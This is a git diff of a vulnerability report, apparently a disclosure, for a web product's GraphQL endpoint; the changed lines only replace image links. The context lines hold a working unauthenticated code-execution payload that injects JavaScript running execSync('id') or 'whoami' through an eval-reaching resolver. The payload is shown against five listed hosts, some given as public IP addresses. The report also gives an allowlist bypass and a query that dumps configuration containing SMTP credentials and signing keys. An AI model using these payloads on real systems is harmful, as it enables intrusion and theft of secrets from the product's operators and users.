@@ -60,7 +60,8 @@ Connection: close
 {"query":"{fbrowser: __typename loginVerifyToken: __typename getConnList(fconnids:\"1)+(function(){throw new Error(require('child_process').execSync('id').toString())})()+(1\",fgroupid:\"\",cloudtoken:\"\")}","ftoken":"","ftokenswarm":""}
 ```
 
-![image-20261119224239950](./图片.assets/image-20261119224239950.png)
+<img width="2559" height="1527" alt="image" src="https://github.com/user-attachments/assets/63fbf3f4-e37b-47d9-8bcc-4a9ad3f65602" />
+
 
 ### 2. 220.160.117.106:88
 
@@ -73,7 +74,8 @@ Connection: close
 {"query":"{fbrowser: __typename loginVerifyToken: __typename getConnList(fconnids:\"1)+(function(){throw new Error(require('child_process').execSync('id').toString())})()+(1\",fgroupid:\"\",cloudtoken:\"\")}","ftoken":"","ftokenswarm":""}
 ```
 
-![image-20261119224338592](./图片.assets/image-20261119224338592.png)
+<img width="2559" height="1527" alt="image" src="https://github.com/user-attachments/assets/632653cb-e132-4e89-a9df-bacf1a7a8e14" />
+
 
 ### 3. jsjxzjps.<redacted>:8080
 
@@ -86,7 +88,9 @@ Connection: close
 {"query":"{fbrowser: __typename loginVerifyToken: __typename getConnList(fconnids:\"1)+(function(){throw new Error(require('child_process').execSync('id').toString())})()+(1\",fgroupid:\"\",cloudtoken:\"\")}","ftoken":"","ftokenswarm":""}
 ```
 
-![image-20261119224437220](./图片.assets/image-20261119224437220.png)
+<img width="2559" height="1527" alt="image" src="https://github.com/user-attachments/assets/ebc840e3-20d4-4ed7-83ce-12762d932a3c" />
+
+
 
 ### 4. db.<redacted>:445 (HTTPS enforced)
 
@@ -99,7 +103,8 @@ Connection: close
 {"query":"{fbrowser: __typename loginVerifyToken: __typename getConnList(fconnids:\"1)+(function(){throw new Error(require('child_process').execSync('id').toString())})()+(1\",fgroupid:\"\",cloudtoken:\"\")}","ftoken":"","ftokenswarm":""}
 ```
 
-![image-20261119224536561](./图片.assets/image-20261119224536561.png)
+<img width="2559" height="1527" alt="image" src="https://github.com/user-attachments/assets/fc97e299-248b-4953-9ab9-a86ef90d2320" />
+
 
 ### 5. 115.231.6.118:897 (Windows)
 
@@ -114,7 +119,8 @@ Connection: close
 {"query":"{fbrowser: __typename loginVerifyToken: __typename getConnList(fconnids:\"1)+(function(){throw new Error(require('child_process').execSync('whoami').toString())})()+(1\",fgroupid:\"\",cloudtoken:\"\")}","ftoken":"","ftokenswarm":""}
 ```
 
-![image-20261119224656982](./图片.assets/image-20261119224656982.png)
+<img width="2559" height="1527" alt="image" src="https://github.com/user-attachments/assets/fec8c18e-ee66-47b0-898a-5518ee246c72" />
+
 
 ## 1. Root cause
 
@@ -198,19 +204,27 @@ login-free.
 
 Allowlist:
 
-![image-20261123215340962](./图片.assets/image-20261123215340962.png)
+
+<img width="2559" height="1527" alt="image" src="https://github.com/user-attachments/assets/37b3ae4f-565f-424a-9678-f56852540787" />
+
 
 The entry used in this report:
 
-![image-20261123220537820](./图片.assets/image-20261123220537820.png)
+
+<img width="2559" height="1527" alt="image" src="https://github.com/user-attachments/assets/9644b1b0-ab30-40c1-9a28-b5f444bc3921" />
+
 
 It lets an unauthenticated request through:
 
-![image-20261123215606454](./图片.assets/image-20261123215606454.png)
+
+<img width="2559" height="1527" alt="image" src="https://github.com/user-attachments/assets/c460d371-fc44-4be2-b6a4-24daae8f3ab0" />
+
 
 `getConnList` then hands the argument to `eval()`:
 
-![image-20261123221035958](./图片.assets/image-20261123221035958.png)
+
+<img width="2559" height="1527" alt="image" src="https://github.com/user-attachments/assets/b241e871-ec8a-4c4c-8752-f063e694eaaf" />
+
 
 ### 1.3 Why the substring check is always bypassable
 
@@ -316,7 +330,9 @@ Content-Type: application/json
 
 Response:
 
-![image-20261117155933302](./图片.assets/image-20261117155933302.png)
+
+<img width="2508" height="897" alt="image" src="https://github.com/user-attachments/assets/753eec63-fdef-46b0-b7c3-c3176f8a7b89" />
+
 
 ### 2.2 Bypass (allowlisted name added to the prefix)
 
@@ -330,7 +346,9 @@ Content-Type: application/json
 
 The resolver now executes and reaches the business stack:
 
-![image-20261117160008170](./图片.assets/image-20261117160008170.png)
+
+<img width="2559" height="1527" alt="image" src="https://github.com/user-attachments/assets/606f9472-6018-40f6-8ee5-4dbdb3bb1295" />
+
 
 ### 2.3 Unauthenticated code execution
 
@@ -343,7 +361,9 @@ Connection: close
 {"query":"{fbrowser: __typename loginVerifyToken: __typename getConnList(fconnids:\"1)+(function(){throw new Error(require('child_process').execSync('id').toString())})()+(1\",fgroupid:\"\",cloudtoken:\"\")}","ftoken":"","ftokenswarm":""}
 ```
 
-![image-20261117160934551](./图片.assets/image-20261117160934551.png)
+
+<img width="2559" height="1527" alt="image" src="https://github.com/user-attachments/assets/5dda56d5-ee9b-404a-9b39-fcd0574201ff" />
+
 
 ### 2.4 Unauthenticated configuration disclosure
 
@@ -355,7 +375,9 @@ Content-Type: application/json
 {"query":"{fbrowser: __typename loginVerifyToken: __typename getConfig{fkey fvalue fencrypt fcrossname}}"}
 ```
 
-![image-20261117160634196](./图片.assets/image-20261117160634196.png)
+
+<img width="2559" height="1526" alt="image" src="https://github.com/user-attachments/assets/40454380-0329-42d6-9b7e-fa0abf71e70b" />
+
 
 The response contains 93 configuration rows, including SMTP credentials, the
 single-sign-on key, the token key and internal topology.
